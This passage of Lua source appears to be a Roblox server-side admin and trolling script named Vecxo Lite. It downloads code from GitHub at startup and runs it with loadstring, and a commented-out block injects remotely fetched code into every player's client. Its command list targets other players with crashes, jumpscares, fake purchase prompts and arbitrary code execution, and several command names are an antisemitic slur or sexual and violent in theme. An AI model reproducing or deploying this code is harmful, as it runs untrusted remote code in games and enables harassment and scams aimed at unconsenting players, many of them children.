	chatRemote.Name = "VecxoChatRemote"
	chatRemote.Parent = game.ReplicatedStorage
end


if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder") then
	local success, result = pcall(function() -- setup
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/setup")
	end)

	if success then
		local content = result
		local loaded, fail = loadstring(content)

		if loaded then
			loaded()
		else
			warn("Failed to load setup script: " .. fail)
		end
	else
		warn("Failed to load setup script")
	end

	local success, result = pcall(function() -- gmod gun
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/gunscript")
	end)

	if success then
		local content = result
		local loaded, fail = loadstring(content)

		if loaded then
			loaded()
		else
			warn("Failed to load gmod gun: " .. fail)
		end
	else
		warn("Failed to load gmod gun.")
	end
end

local function showChatGui(player)
	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoChatGui") then
		player.PlayerGui.VecxoChatGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoChatGui"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 420, 0, 320)
	frame.Position = UDim2.new(0.5, -210, 0.5, -160)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 10)

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Chat Gui"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar

	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	local TweenService = game:GetService("TweenService")

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end
		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end
		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end
			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()
			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true

					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block

					table.insert(blocks, block)
				end
			end
			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end
			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local minimized = false
	local minBtn = Instance.new("TextButton")
	minBtn.Size = UDim2.new(0, 24, 0, 24)
	minBtn.Position = UDim2.new(1, -56, 0.5, -12)
	minBtn.BackgroundTransparency = 1
	minBtn.Text = "‚Äì"
	minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 20
	minBtn.Parent = titleBar

	minBtn.MouseEnter:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
	end)
	minBtn.MouseLeave:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end)
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			frame:TweenSize(UDim2.new(0, 420, 0, 34), "Out", "Quad", 0.25, true)
		else
			frame:TweenSize(UDim2.new(0, 420, 0, 320), "Out", "Quad", 0.25, true)
		end
	end)

	-- Chat messages display scrolling frame
	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -70)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 39)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 8)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	-- Input box frame
	local inputFrame = Instance.new("Frame")
	inputFrame.Size = UDim2.new(1, -10, 0, 28)
	inputFrame.Position = UDim2.new(0, 5, 1, -28 - 5)
	inputFrame.BackgroundTransparency = 0.1
	inputFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	inputFrame.BorderSizePixel = 0
	inputFrame.Parent = frame
	Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 6)

	local inputBox = Instance.new("TextBox")
	inputBox.Size = UDim2.new(1, -10, 1, -4)
	inputBox.Position = UDim2.new(0, 5, 0, 2)
	inputBox.BackgroundTransparency = 0.3
	inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	inputBox.BorderSizePixel = 0
	inputBox.ClearTextOnFocus = false
	inputBox.PlaceholderText = "Type your message here and press Enter..."
	inputBox.TextColor3 = Color3.fromRGB(230, 230, 230)
	inputBox.Font = Enum.Font.Gotham
	inputBox.TextSize = 16
	inputBox.TextXAlignment = Enum.TextXAlignment.Left
	inputBox.Parent = inputFrame

	local function addMessage(text)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame

		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
			scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.CanvasSize.Y.Offset)
		end)
	end

--[[	inputBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local message = inputBox.Text
			if message ~= "" then
				addMessage(player.Name .. ": " .. message) --//if the remote fires with the users input this code fires
				local HttpService = game:GetService("HttpService")
				local code
				local success, err = pcall(function()
					code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
				end)
				if not success then
					warn'http failed with chat api'
					return
				end
				local formattedMessage = `{player.Name}: {message}`
				code = code:gsub('%[Vecko%]: asd', formattedMessage)
				for i, plr in pairs(game.Players:GetPlayers()) do
					task.spawn(function()
						if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
							local ticking = tick()
							require(88532011070135).load()
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("Epic") or tick() - ticking >= 10
						end
						local Epic = game:GetService("ServerScriptService"):FindFirstChild("Epic")
						if not Epic then
							warn("Pro module failed to be added, command cannot continue")
							return
						end

						local scr = Epic:FindFirstChild("Utilities").Client:Clone()
						local loa = Epic:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = code
						if plr.Character then
							scr.Parent = plr:WaitForChild("PlayerGui")
						end
						scr.Enabled = true
					end)
				end
				inputBox.Text = ""
			end
		end
	end) ]]
	local TextChatService = game:GetService("TextChatService")

	inputBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local message = inputBox.Text
			if message ~= "" then
				addMessage(player.Name .. ": " .. message)
				local success, err = pcall(function()
					TextChatService.TextChannels.RBXGeneral:SendAsync(message)
				end)
				if not success then
					warn("Failed to send chat message:", err)
				end

				inputBox.Text = ""
			end
		end
	end)
end 

local TweenService = game:GetService("TweenService")

-- Indices of restricted commands in the commands table
local restrictedCommands = {69,70,71,72,73,74,75,76,77,78,79,80,81,82}

local function showCommandGui(player)
	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoCmds") then
		player.PlayerGui.VecxoCmds:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoCmds"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 420, 0, 320)
	frame.Position = UDim2.new(0.5, -210, 0.5, -160)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 10)

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Commands List"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar

	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end
		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end
		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end
			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()
			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true

					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block

					table.insert(blocks, block)
				end
			end
			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end
			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local minimized = false
	local minBtn = Instance.new("TextButton")
	minBtn.Size = UDim2.new(0, 24, 0, 24)
	minBtn.Position = UDim2.new(1, -56, 0.5, -12)
	minBtn.BackgroundTransparency = 1
	minBtn.Text = "‚Äì"
	minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 20
	minBtn.Parent = titleBar

	minBtn.MouseEnter:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
	end)
	minBtn.MouseLeave:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end)
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			frame:TweenSize(UDim2.new(0, 420, 0, 34), "Out", "Quad", 0.25, true)
		else
			frame:TweenSize(UDim2.new(0, 420, 0, 320), "Out", "Quad", 0.25, true)
		end
	end)

	local darkContainer = Instance.new("Frame")
	darkContainer.Size = UDim2.new(1, -10, 1, -44)
	darkContainer.Position = UDim2.new(0, 5, 0, 39)
	darkContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	darkContainer.BackgroundTransparency = 0
	darkContainer.BorderSizePixel = 0
	darkContainer.Parent = frame
	Instance.new("UICorner", darkContainer).CornerRadius = UDim.new(0, 8)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -6, 1, -6)
	scrollingFrame.Position = UDim2.new(0, 3, 0, 3)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 1
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = darkContainer

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local commands = {
		"--// Universal Commands \\--",
		"1   - !god <plr|all|others|random|friends>",
		"2   - !ungod <plr|all|others|random|friends>",
		"3   - !fire <plr|all|others|random|friends>",
		"4   - !unfire <plr|all|others|random|friends>",
		"5   - !sparkles <plr|all|others|random|friends>",
		"6   - !unsparkles <plr|all|others|random|friends>",
		"7   - !bighead <plr|all|others|random|friends>",
		"8   - !minihead <plr|all|others|random|friends>",
		"9   - !jumppower <plr|all|others|random|friends> <value>",
		"10  - !speed <plr|all|others|random|friends> <value>",
		"11  - !health <plr|all|others|random|friends> <value>",
		"12  - !sit <plr|all|others|random|friends>",
		"13  - !jump <plr|all|others|random|friends>",
		"14  - !invisible <plr|all|others|random|friends>",
		"15  - !visible <plr|all|others|random|friends>",
		"16  - !trip <plr|all|others|random|friends>",
		"17  - !stun <plr|all|others|random|friends>",
		"18  - !unstun <plr|all|others|random|friends>",
		"19  - !explode <plr|all|others|random|friends>",
		"20  - !fling <plr|all|others|random|friends>",
		"21  - !resize <plr|all|others|random|friends> <scale>",
		"22  - !headsize <plr|all|others|random|friends> <scale>",
		"23  - !rainbowify <plr|all|others|random|friends>",
		"24  - !flashify <plr|all|others|random|friends>",
		"25  - !goldify <plr|all|others|random|friends>",
		"26  - !shinify <plr|all|others|random|friends>",
		"27  - !silverify <plr|all|others|random|friends>",
		"28  - !neonify <plr|all|others|random|friends>",
		"29  - !glowify <plr|all|others|random|friends>",
		"30  - !char <plr|all|others|random|friends> <username>",
		"31  - !unchar <plr|all|others|random|friends>",
		"32  - !smite <plr|all|others|random|friends>",
		"33  - !perm <plr>",
		"34  - !unperm <plr>",
		"35  - !p299 <plr>",
		"36  - !unp299 <plr>",
		"37  - !kick <plr|all|others|random|friends>",
		"38  - !ban <plr|all|others|random|friends>",
		"39  - !unban <plr|all|others|random|friends>",
		"40  - !permban <plr|all|others|random|friends>",
		"41  - !unpermban <plr|all|others|random|friends>",
		"42  - !rj <plr|all|others|random|friends>",
		"43  - !wl <plr|all|others|random|friends>",
		"44  - !unwl <plr|all|others|random|friends>",
		"45  - !re <plr|all|others|random|friends>",
		"46  - !stickbeater <plr|all|others|random|friends>",
		"47  - !knife <plr|all|others|random|friends>",
		"48  - !magician <plr|all|others|random|friends>",
		"49  - !bombvest <plr|all|others|random|friends>",
		"50  - !toolgun <plr|all|others|random|friends>",
		"51  - !gentk <plr|all|others|random|friends>",
		"52  - !sledgehammer <plr|all|others|random|friends>",
		"53  - !provac <plr|all|others|random|friends>",
		"54  - !dex <plr|all|others|random|friends>",
		"55  - !cage <plr|all|others|random|friends>",
		"56  - !grabgun <plr|all|others|random|friends>",
		"57  - !oofgun <plr|all|others|random|friends>",
		"58  - !mute <plr|all|others|random|friends>",
		"59  - !unmute <plr|all|others|random|friends>",
		"60  - !crash <plr|all|others|random|friends>",
		"61  - !jumpscare <plr|all|others|random|friends>",
		"62  - !clyde <plr|all|others|random|friends>",
		"63  - !bclient <plr|all|others|random|friends>",
		"64  - !to <plr|all|others|random|friends>",
		"65  - !bring <plr|all|others|random|friends>",
		"66  - !kidnap <plr|all|others|random|friends>",
		"67  - !chat <plr|all|others|random|friends> [string]",
		"68  - !afk <plr|all|others|random|friends>",
		"69  - !unafk <plr|all|others|random|friends>",
		"70  - !tazer <plr|all|others|random|friends>",
		"71  - !backpack <plr|all|others|random|friends> <true/false>",
		"72  - !sfakereq <plr|all|others|random|friends> <name>",
		"73  - !image <plr|all|others|random|friends> <name> <true/false>",
		"74  - !flashbang <plr|all|others|random|friends>",
		"75  - !antikill <plr|all|others|random|friends>",
		"76  - !unantikill <plr|all|others|random|friends>",
		"77  - !antipunish <plr|all|others|random|friends>",
		"78  - !unantipunish <plr|all|others|random|friends>",
		"79  - !promptpurchase <plr|all|others|random|friends> <itemId> <price> <itemName with spaces>",
		"80  - !f3x <plr|all|others|random|friends>",
		"81  - !findgear <plr|all|others|random|friends> <string/tool name>",
		"82  - !pkick <plr|all|others|random|friends>",
		"83  - !nuke <plr|all|others|random|friends>",
		"84  - !kfc <plr|all|others|random|friends>",
		"85  - !711 <plr|all|others|random|friends>",
		"86  - !burgerking <plr|all|others|random|friends>",
		"87  - !mcdonalds <plr|all|others|random|friends>",
		"88  - !subway <plr|all|others|random|friends>",
		"89  - !towers <plr|all|others|random|friends>",
		"90  - !basketball <plr|all|others|random|friends>",
		"91  - !gmod <plr|all|others|random|friends>",
		"92  - !creeper <plr|all|others|random|friends>",
		"93  - !maxwell <plr|all|others|random|friends>",
		"94  - !iy <plr|all|others|random|friends>",
		"95  - !slenderman <plr|all|others|random|friends>",
		"96  - !jew <plr|all|others|random|friends>",
		"97  - !killbot <plr|all|others|random|friends>",
		"98  - !monarch <plr|all|others|random|friends>",
		"99  - !sentinel <plr|all|others|random|friends>",
		"100 - !pizzafrenzy <plr|all|others|random|friends>",
		"101 - !spraypaint <plr|all|others|random|friends>",
		"102 - !fixcam <plr|all|others|random|friends>",
		"103 - !bhop <plr|all|others|random|friends>",
		"104 - !cannon <plr|all|others|random|friends>",
		"105 - !tools <plr|all|others|random|friends>",
		"106 - !stampertools <plr|all|others|random|friends>",
		"107 - !wormhole <plr|all|others|random|friends>",
		"108 - !startergear <plr|all|others|random|friends> <id>",
		"109 - !unstartergear <plr|all|others|random|friends>",
		"110 - !respawn <plr|all|others|random|friends>",
		"111 - !r6 <plr|all|others|random|friends>",
		"112 - !r15 <plr|all|others|random|friends>",
		"113 - !cguis <plr|all|others|random|friends>",
		"114 - !antiexe <plr|all|others|random|friends>",

		"--// Locked Commands \\--",
		"115 - !hang <plr|all|others|random|friends> [üîí]",
		"116 - !crucify <plr|all|others|random|friends> [üîí]",
		"117 - !guil <plr|all|others|random|friends> [üîí]",
		"118 - !hang2 <plr|all|others|random|friends> [üîí]",
		"119 - !woman <plr|all|others|random|friends> [RESTRICTED] [üîí]",
		"120 - !bang <plr1> [optional] <plr2> [RESTRICTED] [üîí]",

		"--// Restricted Commands \\--",
		"121 - !s <code> [RESTRICTED]",
		"122 - !jork <plr|all|others|random|friends> [RESTRICTED]",
		"123 - !polaria <plr|all|others|random|friends> [RESTRICTED]",
		"124 - !sens <plr|all|others|random|friends> [RESTRICTED]",
		"125 - !projhub <plr|all|others|random|friends> [RESTRICTED]",
		"126 - !hwl <plr|all|others|random|friends> [RESTRICTED]",
		"127 - !unhwl <plr|all|others|random|friends> [RESTRICTED]",
		"128 - !buildload <plr> <slot> [KAH ONLY] [RESTRICTED]",
		"129 - !buildremove <plr> <slot> [KAH ONLY] [RESTRICTED]",
		"130 - !exser <plr|all|others|random|friends> [RESTRICTED]",
		"131 - !legacychat [RESTRICTED]",
		"132 - !synapse <plr|all|others|random|friends> [RESTRICTED]",
		"133 - !nfchat [RESTRICTED]",
		"134 - !ls <plr|all|others|random|friends> <code> [RESTRICTED]",
		"135 - !stratosphere <plr|all|others|random|friends> [RESTRICTED]",
		"136 - !happyhub <plr|all|others|random|friends> [RESTRICTED]",
		"137 - !forceplace <plr|all|others|random|friends> <id> [RESTRICTED]",
		"138 - !adonis <plr> [RESTRICTED]",

		"--// Utility Commands \\--",
		"139 - !h <message>",
		"140 - !clr - Cleans the server of junk",
		"141 - !shutdown <reason> - Shuts the server down",
		"142 - !wls - View whitelisted users in current server",
		"143 - !plrlist - View current players in server",
		"144 - !bans - View banned players from the current server",
		"145 - !permbans - View permanently banned players across all servers",
		"146 - !restoremap - Generates the newest KAH map [LEGACY ONLY]",
		"147 - !hideobby - Hides the obby",
		"148 - !unhideobby - Unhides the obby",
		"149 - !unload - Unloads Vecxo Lite",
		"150 - !reloadscript - Unloads and Reloads Vecxo Lite",
		"151 - !gobby - Generates cool obby",
		"152 - !nukemap - Places tactical nukes everywhere",
		"153 - !serverprotection <true/false>",
		"154 - !antialt <true/false> - Kicks accounts younger than 2 days automatically",
		"155 - !antiloudnoise <true/false>",
		"156 - !cmdbar - Opens the command bar",
		"157 - !logs - Opens logs",
		"158 - !restart - Restarts the server and opens a new one",
		"159 - !exit - You leave za server :D",
		"160 - !info - Script/Server information",
		"161 - !ogmap - Re-generates 2013 OG KAG map",
		"162 - !spleef <value> <value2> - OG Spleef game",
		"163 - !loadmap - Loads a previously saved map",
		"164 - !savemap - Saves the current map",
		"165 - !antiskid - Loads an Anti Skid module [For Require games]",
		"166 - !baseplate - Creates and places a baseplate",
		"167 - !mapprotection <true/false> - Attempts to reload the map if damaged",
		"168 - !findsong <string>",
		"169 - !music <id>",
		"170 - !time <value>",
		"171 - !partmoving <true/false>",
		"172 - !pitch <value>",
		"173 - !volume <value>"
	}


	for i, text in ipairs(commands) do
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		local displayText = text
		if not text:match("^%-%-//") then
			if text:find("%[RESTRICTED%]") then
				if table.find(exclusivewl, player.Name) then
					displayText = text:gsub("%[RESTRICTED%]", "[APPROVED]") .. " ‚úÖ"
				else
					displayText = text .. " ‚ùå"
				end
			else
				if table.find(whitelisted, tostring(player.UserId)) then
					displayText = text .. " ‚úÖ"
				end
				if not table.find(whitelisted, tostring(player.UserId)) then
					displayText = text .. " ‚ùå"
				end
			end
		end
		label.Text = displayText
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	end
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
	for _, child in ipairs(frame:GetChildren()) do
		if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") or child:IsA("Frame") then
			child.Visible = false
		end
	end

	local function unfoldGui()
		local rows, cols = 4, 6
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local blocks = {}
		for r = 0, rows - 1 do
			for c = 0, cols - 1 do
				local block = Instance.new("Frame")
				block.Size = UDim2.new(0, 0, 0, 0)
				block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight + blockHeight / 2)
				block.BackgroundColor3 = frame.BackgroundColor3
				block.BorderSizePixel = 0
				block.BackgroundTransparency = 1
				block.Rotation = 90
				block.Parent = frame
				block.ClipsDescendants = true

				local uicorner = Instance.new("UICorner")
				uicorner.CornerRadius = UDim.new(0, 6)
				uicorner.Parent = block

				table.insert(blocks, block)
			end
		end
		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		for i, block in ipairs(blocks) do
			local delay = (i - 1) * 0.03
			task.delay(delay, function()
				local tween = TweenService:Create(block, tweenInfo, {
					Size = UDim2.new(0, blockWidth, 0, blockHeight),
					Rotation = 0,
					Position = UDim2.new(0, ((i - 1) % cols) * blockWidth, 0, math.floor((i - 1) / cols) * blockHeight),
					BackgroundTransparency = 0,
				})
				tween:Play()
			end)
		end
		task.delay(0.03 * #blocks + 0.35, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") or child:IsA("Frame") then
					child.Visible = true
				end
			end
			for _, block in ipairs(blocks) do
				block:Destroy()
			end
		end)
	end
	unfoldGui()
end

local userNameCache = {}

local function GetUserName(userId)
	if userNameCache[userId] then
		return userNameCache[userId]
	end
	local userIdNum = tonumber(userId)
	if not userIdNum then return tostring(userId) end
	for _, player in ipairs(Players:GetPlayers()) do
		if player.UserId == userIdNum then
			userNameCache[userId] = player.Name
			return player.Name
		end
	end
	local success, result = pcall(function()
		return Players:GetNameFromUserIdAsync(userIdNum)
	end)
	if success and result then
		userNameCache[userId] = result
		return result
